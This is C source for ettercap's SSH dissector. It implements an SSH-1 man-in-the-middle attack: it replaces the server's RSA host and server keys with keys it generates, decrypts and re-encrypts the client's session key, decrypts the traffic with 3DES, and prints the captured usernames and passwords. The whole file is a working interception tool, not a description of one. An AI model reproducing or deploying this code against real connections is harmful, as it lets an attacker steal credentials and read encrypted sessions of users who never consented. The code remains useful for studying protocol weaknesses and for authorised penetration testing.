/*
    ettercap -- dissector ssh -- TCP 22

    Copyright (C) ALoR & NaGA

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: ec_ssh.c,v 1.5 2003/10/20 14:48:01 lordnaga Exp $
*/

#include <ec.h>
#include <ec_decode.h>
#include <ec_dissect.h>
#include <ec_session.h>
#include <ec_streambuf.h>

#include <openssl/ssl.h>


/* My RSA keys */
typedef struct {
    RSA *myserverkey;
    RSA *myhostkey;
    u_int32 server_mod;
    u_int32 host_mod;
    struct ssh_my_key *next;
} ssh_my_key;

/* Session Key data */
typedef struct {
    RSA *serverkey;
    RSA *hostkey;
    ssh_my_key *ptrkey;
    void *key_state[2];
    struct stream_buf data_buffer[2];
#define MAX_USER_LEN 28
    u_char user[MAX_USER_LEN+1];
    u_char status;
#define WAITING_PUBLIC_KEY 1
#define WAITING_SESSION_KEY 2
#define WAITING_ENCRYPTED_PCK 3

} ssh_session_data;

struct des3_state
{
   des_key_schedule        k1, k2, k3;
   des_cblock              iv1, iv2, iv3;
};

#define PCK_PUBLIC_KEY 2
#define PCK_SESSION_KEY 3


/* globals */

/* Pointer to our RSA key list */
ssh_my_key *ssh_conn_key=NULL;


/* protos */

FUNC_DECODER(dissector_ssh);
void ssh_init(void);
static void put_bn(BIGNUM *bn, u_char **pp);
static void get_bn(BIGNUM *bn, u_char **pp);
static u_char *ssh_session_id(u_char *cookie, BIGNUM *hostkey_n, BIGNUM *serverkey_n);
void rsa_public_encrypt(BIGNUM *out, BIGNUM *in, RSA *key);
void rsa_private_decrypt(BIGNUM *out, BIGNUM *in, RSA *key);
void des3_decrypt(u_char *src, u_char *dst, int len, void *state);
void *des3_init(u_char *sesskey, int len);
u_int32 ssh_crc(u_char *buffer, u_int32 len);
int32 read_packet(u_char **buffer, struct stream_buf *dbuf);

/************************************************/

/*
 * this function is the initializer.
 * it adds the entry in the table of registered decoder
 */

void __init ssh_init(void)
{
   dissect_add("ssh", APP_LAYER_TCP, 22, dissector_ssh);
}

FUNC_DECODER(dissector_ssh)
{
   struct session *s = NULL;
   ssh_session_data *session_data;
   void *ident = NULL;
   char tmp[MAX_ASCII_ADDR_LEN];
   u_int32 ssh_len, ssh_mod;
   u_char ssh_packet_type, *ptr, *key_to_put;

   /* skip empty packets (ACK packets) */
   if (PACKET->DATA.len == 0)
      return NULL;

   dissect_create_ident(&ident, PACKET);
   
   /* Is this a brand new session?.
    * If the aggressive dissectors are 
    * off performs only banner catching.
    */
   
   if (!GBL_CONF->aggressive_dissectors || session_get(&s, ident, DISSECT_IDENT_LEN) == -ENOTFOUND) { 
      SAFE_FREE(ident);
      /* Create the session on first server's cleartext packet */
      if(!memcmp(PACKET->DATA.data,"SSH-",4) && FROM_SERVER("ssh", PACKET)) {

         /* Only if we are interested on key substitution */         
         if(GBL_CONF->aggressive_dissectors) {
            dissect_create_session(&s, PACKET);
            SAFE_CALLOC(s->data, sizeof(ssh_session_data), 1);
            session_put(s);
            session_data =(ssh_session_data *)s->data;
            session_data->status = WAITING_PUBLIC_KEY;
         }

         /* Catch the version banner */
         SAFE_CALLOC(PACKET->DISSECTOR.banner, 9, 1);
         memcpy(PACKET->DISSECTOR.banner, PACKET->DATA.data, 8);
      }      
   } else { /* The session exists */
      session_data =(ssh_session_data *)s->data;
      SAFE_FREE(ident);
      
      /* If we are ready to decrypt packets */
      if (session_data->status == WAITING_ENCRYPTED_PCK) {
         u_char direction, *crypted_packet=NULL, *clear_packet=NULL;
         u_int32 data_len;
	 
         /* Check what key and stream buffer we have to use */	 
         if(FROM_SERVER("ssh", PACKET))
            direction = 0;
         else
            direction = 1;

         /* Add this packet to the stream */
         streambuf_seq_add(&(session_data->data_buffer[direction]), PACKET);
       
         /* We are decrypting, so we'll arrange disp_data by our own */
         PACKET->DATA.disp_len = 0;
	 
         /* While there are packets to read from the stream */
         while(read_packet(&crypted_packet, &(session_data->data_buffer[direction])) == ESUCCESS) {        
            ssh_len = pntol(crypted_packet);
            ssh_mod = 8 - (ssh_len % 8);

            /* SAFE_CALLOC is not good to handle errors */
            clear_packet = (u_char *)malloc(ssh_len + ssh_mod);
            if (clear_packet == NULL) {
               SAFE_FREE(crypted_packet);
               return NULL;
            }
	        
            /* Decrypt the packet (jumping over pck len) using correct key */
            des3_decrypt(crypted_packet+4, clear_packet, ssh_len + ssh_mod, session_data->key_state[direction]);
	    
            /* Catch packet type and slide to the data */
            ptr = clear_packet + ssh_mod;
            ssh_packet_type = *ptr;
            ptr++;

            /* Catch data len and slide to the payload */
            data_len = pntol(ptr);
            ptr+=4;

            if (ssh_packet_type==4) { /* SSH_CMSG_USER */
               DEBUG_MSG("\tDissector_ssh USER");
               /* User will always be NULL terminated 
                * (it's calloc'd MAX_USER_LEN + 1)
                */
                memcpy(session_data->user, ptr, (data_len>MAX_USER_LEN) ? MAX_USER_LEN : data_len);
            } else if (ssh_packet_type==9) { /* SSH_AUTH_PASSWORD */
               DEBUG_MSG("\tDissector_ssh PASS");
               /* avoid bof */
               if (data_len > MAX_USER_LEN) {
                  SAFE_FREE(clear_packet);	 
                  SAFE_FREE(crypted_packet);
                  return NULL;
               }
	              
               SAFE_CALLOC(PACKET->DISSECTOR.pass, data_len+1, 1);	    
               memcpy(PACKET->DISSECTOR.pass, ptr, data_len);
               PACKET->DISSECTOR.user = strdup(session_data->user); /* Surely NULL terminated */
               USER_MSG("SSH : %s:%d -> USER: %s  PASS: %s\n", ip_addr_ntoa(&PACKET->L3.dst, tmp),
                                                               ntohs(PACKET->L4.dst),
                                                               PACKET->DISSECTOR.user,
                                                               PACKET->DISSECTOR.pass);

            } else if (ssh_packet_type==5) {
               DEBUG_MSG("\tDissector_ssh RHOSTS");
               PACKET->DISSECTOR.user = strdup(session_data->user);
               /* XXX Do we need to catch more infos from this kind of packet? */
               PACKET->DISSECTOR.pass = strdup("RHOSTS-AUTH\n");
               USER_MSG("SSH : %s:%d -> USER: %s  %s\n", ip_addr_ntoa(&PACKET->L3.dst, tmp),
                                                         ntohs(PACKET->L4.dst),
                                                         PACKET->DISSECTOR.user,
                                                         PACKET->DISSECTOR.pass);
            } else if (ssh_packet_type==6) {
               DEBUG_MSG("\tDissector_ssh RSA AUTH");
               PACKET->DISSECTOR.user = strdup(session_data->user);
               PACKET->DISSECTOR.pass = strdup("RSA-AUTH\n");
               USER_MSG("SSH : %s:%d -> USER: %s  %s\n", ip_addr_ntoa(&PACKET->L3.dst, tmp),
                                                         ntohs(PACKET->L4.dst),
                                                         PACKET->DISSECTOR.user,
                                                         PACKET->DISSECTOR.pass);
            }
            
            /* These are readable packets so copy it in the DISPDATA */
            if ((ssh_packet_type>=16 && ssh_packet_type<=18) ||
                 ssh_packet_type==4 || ssh_packet_type==9) {
               u_char *temp_disp_data;

               /* Avoid int overflow */
               if (PACKET->DATA.disp_len + data_len + 1 < PACKET->DATA.disp_len) {
                  SAFE_FREE(clear_packet);	 
                  SAFE_FREE(crypted_packet);
                  return NULL;
               }
		  	        
               /* Add this decrypted packet to the disp_data. 
                * There can be more than one ssh packet in a tcp pck.
                * We use a temp buffer to not feed top half with a null 
                * pointer to disp_data.                
                */
               temp_disp_data = (u_char *)realloc(PACKET->DATA.disp_data, PACKET->DATA.disp_len + data_len + 1);
               if (temp_disp_data == NULL) {
                  SAFE_FREE(clear_packet);	 
                  SAFE_FREE(crypted_packet);
                  return NULL;
               }
               PACKET->DATA.disp_data = temp_disp_data;
               memcpy(PACKET->DATA.disp_data+PACKET->DATA.disp_len, ptr, data_len); 		  	       
               PACKET->DATA.disp_len += data_len;
            }
            
            SAFE_FREE(clear_packet);	 
            SAFE_FREE(crypted_packet);
         }
	 	 
         /* We are no longer interested on key stuff */
         return NULL;
      }

      /* We are not ready to decrypt packets because 
       * we are still waiting for some key stuff.
       */
      /* We need the packet to be forwardable to mangle
       * key exchange. Otherwise wipe the session.
       */
      if(!(PACKET->flags & PO_FORWARDABLE)) {
         dissect_wipe_session(PACKET);
         return NULL;
      }
       
      /* Catch packet type and skip to data */
      ssh_len = pntol(PACKET->DATA.data);
      ssh_mod = 8 - (ssh_len % 8);
      ptr = PACKET->DATA.data + 4 + ssh_mod;
      ssh_packet_type = *ptr;
      ptr++;

      if(FROM_SERVER("ssh", PACKET)) {  /* Server Packets (Public Key) */
      
         /* Enter if we are waiting for PublicKey packet.
          * Enter even if we are waiting for SessionKey:
          * if the server sends the public key twice we have 
          * to replace both. 
          */	  
         if ((session_data->status==WAITING_PUBLIC_KEY ||  session_data->status==WAITING_SESSION_KEY) && ssh_packet_type==PCK_PUBLIC_KEY) {
            ssh_my_key **index_ssl;
            u_int32 server_mod, host_mod;
 
            /* Remember where to put the key */
            ptr+=8; 
            key_to_put=ptr;
	    
            /* If it's the first time we catch the public key */
            if (session_data->ptrkey == NULL) { 
               /* Initialize RSA key structures (other fileds are set to 0) */
               session_data->serverkey = RSA_new();
               session_data->serverkey->n = BN_new();
               session_data->serverkey->e = BN_new();

               session_data->hostkey = RSA_new();
               session_data->hostkey->n = BN_new();
               session_data->hostkey->e = BN_new();

               /* Get the RSA Key from the packet */
               NS_GET32(server_mod,ptr);
               if (ptr + (server_mod/8) > PACKET->DATA.data + PACKET->DATA.len) {
                  DEBUG_MSG("Dissector_ssh Bougs Server_Mod");
                  return NULL;
               }
               get_bn(session_data->serverkey->e, &ptr);
               get_bn(session_data->serverkey->n, &ptr);

               NS_GET32(host_mod,ptr);
               if (ptr + (host_mod/8) > PACKET->DATA.data + PACKET->DATA.len) {
                  DEBUG_MSG("Dissector_ssh Bougs Host_Mod");
                  return NULL;
               }
               get_bn(session_data->hostkey->e, &ptr);
               get_bn(session_data->hostkey->n, &ptr);

               /* Check if we already have a suitable RSA key to substitute */
               index_ssl = &ssh_conn_key;
               while(*index_ssl != NULL && ( (*index_ssl)->server_mod!=server_mod || (*index_ssl)->host_mod!=host_mod))
                  index_ssl = (ssh_my_key **)&((*index_ssl)->next);

               /* ...otherwise generate it */
               if (*index_ssl == NULL) {
                  SAFE_CALLOC(*index_ssl, 1, sizeof(ssh_my_key));

                  /* Generate the new key */
                  (*index_ssl)->myserverkey=(RSA *)RSA_generate_key(server_mod, 35, NULL, NULL);
                  (*index_ssl)->myhostkey=(RSA *)RSA_generate_key(host_mod, 35, NULL, NULL);
                  (*index_ssl)->server_mod=server_mod;
                  (*index_ssl)->host_mod=host_mod;
                  (*index_ssl)->next = NULL;
                  if ((*index_ssl)->myserverkey==NULL || (*index_ssl)->myhostkey==NULL) {
                     SAFE_FREE(*index_ssl);
                     return NULL;
                  }
               }
	    
               /* Assign the key to the session */
               session_data->ptrkey = *index_ssl;
            }

            /* Put our RSA key in the packet */
            key_to_put+=4;
            put_bn(session_data->ptrkey->myserverkey->e, &key_to_put);
            put_bn(session_data->ptrkey->myserverkey->n, &key_to_put);
            key_to_put+=4;
            put_bn(session_data->ptrkey->myhostkey->e, &key_to_put);
            put_bn(session_data->ptrkey->myhostkey->n, &key_to_put);

            /* Set the mask to 3DES */
            *(u_int32 *)(PACKET->DATA.data + PACKET->DATA.len - 12) = htonl(8);
            /* Recalculate SSH crc */
            *(u_int32 *)(PACKET->DATA.data + PACKET->DATA.len - 4) = htonl(ssh_crc(PACKET->DATA.data+4, PACKET->DATA.len-8));
	                
            PACKET->flags |= PO_MODIFIED;	 
            session_data->status = WAITING_SESSION_KEY;
         }	 
      } else { /* Client Packets (Session Key) */
         if (session_data->status==WAITING_SESSION_KEY && ssh_packet_type==PCK_SESSION_KEY) {
            u_char cookie[8], sesskey[32], session_id1[16], session_id2[16];
            u_char *temp_session_id;
            BIGNUM *enckey, *bn;
            u_int32 i;

            /* Get the cookie */
            memcpy(cookie, ++ptr, 8);
            ptr+=8; 
            key_to_put=ptr;

            /* Calculate real session id and our fake session id */
            temp_session_id=ssh_session_id(cookie, session_data->hostkey->n,session_data->serverkey->n);
            if (temp_session_id)
               memcpy(session_id1, temp_session_id, 16);
            temp_session_id=ssh_session_id(cookie, session_data->ptrkey->myhostkey->n,session_data->ptrkey->myserverkey->n);
            if (temp_session_id)
               memcpy(session_id2, temp_session_id, 16);

            /* Get the session key */
            enckey = BN_new();
            get_bn(enckey, &ptr);

            /* Decrypt session key */
            if (BN_cmp(session_data->ptrkey->myserverkey->n, session_data->ptrkey->myhostkey->n) > 0) {
              rsa_private_decrypt(enckey, enckey, session_data->ptrkey->myserverkey);
              rsa_private_decrypt(enckey, enckey, session_data->ptrkey->myhostkey);
            } else {
              rsa_private_decrypt(enckey, enckey, session_data->ptrkey->myhostkey);
              rsa_private_decrypt(enckey, enckey, session_data->ptrkey->myserverkey);
            }

            BN_mask_bits(enckey, sizeof(sesskey) * 8);
            i = BN_num_bytes(enckey);
            memset(sesskey, 0, sizeof(sesskey));
            BN_bn2bin(enckey, sesskey + sizeof(sesskey) - i);
            BN_clear_free(enckey);

            for (i = 0; i < 16; i++)
              sesskey[i] ^= session_id2[i];

            /* Save SessionKey */
            session_data->key_state[0] = des3_init(sesskey, sizeof(sesskey));
            session_data->key_state[1] = des3_init(sesskey, sizeof(sesskey));

            /* Re-encrypt SessionKey with the real RSA key */
            bn = BN_new();
            BN_set_word(bn, 0);

            for (i = 0; i < sizeof(sesskey); i++)  {
              BN_lshift(bn, bn, 8);
              if (i < 16) 
                 BN_add_word(bn, sesskey[i] ^ session_id1[i]);
              else 
                 BN_add_word(bn, sesskey[i]);
            }

            if (BN_cmp(session_data->serverkey->n, session_data->hostkey->n) < 0) {
               rsa_public_encrypt(bn, bn, session_data->serverkey);
               rsa_public_encrypt(bn, bn, session_data->hostkey);
            } else {
               rsa_public_encrypt(bn, bn, session_data->hostkey);
               rsa_public_encrypt(bn, bn, session_data->serverkey);
            }

            /* Clear the session */
            RSA_free(session_data->serverkey);
            RSA_free(session_data->hostkey);

            /* Put right Session Key in the packet */
            put_bn(bn, &key_to_put);
            BN_clear_free(bn);

            /* Re-calculate SSH crc */
            *(u_int32 *)(PACKET->DATA.data + PACKET->DATA.len - 4) = htonl(ssh_crc(PACKET->DATA.data+4, PACKET->DATA.len-8));

            /* XXX Here we should notify the top half that the 
             * connection is decrypted 
             */

            /* Initialize the stream buffers for decryption */
            streambuf_init(&(session_data->data_buffer[0])); 
            streambuf_init(&(session_data->data_buffer[1]));
	    
            PACKET->flags |= PO_MODIFIED;	 
            session_data->status = WAITING_ENCRYPTED_PCK;
         }      
      }
   }
       
   return NULL;
}      

/* Read a crypted packet from the stream. 
 * The buffer is dynamically allocated, so
 * calling function has to free it.
 */
int32 read_packet(u_char **buffer, struct stream_buf *dbuf)
{
   int32 length, mod;
   
   /* Read packet length and calculate modulus */
   if (streambuf_read(dbuf, (u_char *)&length, 4, STREAM_ATOMIC) == -EINVALID)
      return -EINVALID;
   length = ntohl(length);   
   mod = 8 - (length % 8);

   /* Allocate the buffer and read the whole packet 
    * SAFE_CALLOC is not good to handle errors.    
    */
   *buffer = (u_char *)malloc(length + mod + 4);
   if (*buffer == NULL)
      return -EINVALID;
      
   if (streambuf_get(dbuf, *buffer, length + mod + 4, STREAM_ATOMIC) == -EINVALID) {
      SAFE_FREE(*buffer);
      return -EINVALID;
   }
      
   return ESUCCESS;
}

void *des3_init(u_char *sesskey, int len)
{
   struct des3_state *state;

   state = malloc(sizeof(*state));

   des_set_key((void *)sesskey, state->k1);
   des_set_key((void *)(sesskey + 8), state->k2);

   if (len <= 16)
      des_set_key((void *)sesskey, state->k3);
   else
      des_set_key((void *)(sesskey + 16), state->k3);

   memset(state->iv1, 0, 8);
   memset(state->iv2, 0, 8);
   memset(state->iv3, 0, 8);

   return (state);
}

void des3_decrypt(u_char *src, u_char *dst, int len, void *state)
{
   struct des3_state *dstate;

   dstate = (struct des3_state *)state;
   memcpy(dstate->iv1, dstate->iv2, 8);

   des_ncbc_encrypt(src, dst, len, dstate->k3, &dstate->iv3, DES_DECRYPT);
   des_ncbc_encrypt(dst, dst, len, dstate->k2, &dstate->iv2, DES_ENCRYPT);
   des_ncbc_encrypt(dst, dst, len, dstate->k1, &dstate->iv1, DES_DECRYPT);
}

static void put_bn(BIGNUM *bn, u_char **pp)
{
   short i;

   i = BN_num_bits(bn);
   NS_PUT16(i, *pp);
   *pp+=BN_bn2bin(bn, *pp);
}

static void get_bn(BIGNUM *bn, u_char **pp)
{
   short i;

   NS_GET16(i, *pp);
   i = ((i + 7) / 8);
   BN_bin2bn(*pp, i, bn);
   *pp += i;
}

static u_char *ssh_session_id(u_char *cookie, BIGNUM *hostkey_n, BIGNUM *serverkey_n)
{
   static u_char sessid[16];
   u_int i, j;
   u_char *p;

   i = BN_num_bytes(hostkey_n);
   j = BN_num_bytes(serverkey_n);

   if ((p = malloc(i + j + 8)) == NULL)
      return (NULL);

   BN_bn2bin(hostkey_n, p);
   BN_bn2bin(serverkey_n, p + i);
   memcpy(p + i + j, cookie, 8);

   MD5(p, i + j + 8, sessid);
   free(p);

   return (sessid);
}

void rsa_public_encrypt(BIGNUM *out, BIGNUM *in, RSA *key)
{
   u_char *inbuf, *outbuf;
   int len, ilen, olen;

   olen = BN_num_bytes(key->n);
   outbuf = malloc(olen);

   ilen = BN_num_bytes(in);
   inbuf = malloc(ilen);

   BN_bn2bin(in, inbuf);

   len = RSA_public_encrypt(ilen, inbuf, outbuf, key, RSA_PKCS1_PADDING);

   BN_bin2bn(outbuf, len, out);

   free(outbuf);
   free(inbuf);
}

void rsa_private_decrypt(BIGNUM *out, BIGNUM *in, RSA *key)
{
   u_char *inbuf, *outbuf;
   int len, ilen, olen;

   olen = BN_num_bytes(key->n);
   outbuf = malloc(olen);

   ilen = BN_num_bytes(in);
   inbuf = malloc(ilen);

   BN_bn2bin(in, inbuf);

   len = RSA_private_decrypt(ilen, inbuf, outbuf, key, RSA_PKCS1_PADDING);

   BN_bin2bn(outbuf, len, out);

   free(outbuf);
   free(inbuf);
}

u_int32 ssh_crc(u_char *buffer, u_int32 len)
{
    u_int32 crc_32_tab[] = {
    0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,
    0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,
    0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,
    0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,
    0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,
    0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,
    0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,
    0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,
    0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,
    0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,
    0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,
    0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,
    0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,
    0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,
    0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,
    0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,
    0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,
    0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,
    0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,
    0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,
    0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,
    0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
    };
    u_int32 crc;
    u_int32 i;

    crc = 0x0;
    for(i=0; i<len; i++)
    crc = crc_32_tab[(crc^buffer[i]) &0xff] ^ (crc>>8);

    return crc;
}


/* EOF */

// vim:ts=3:expandtab
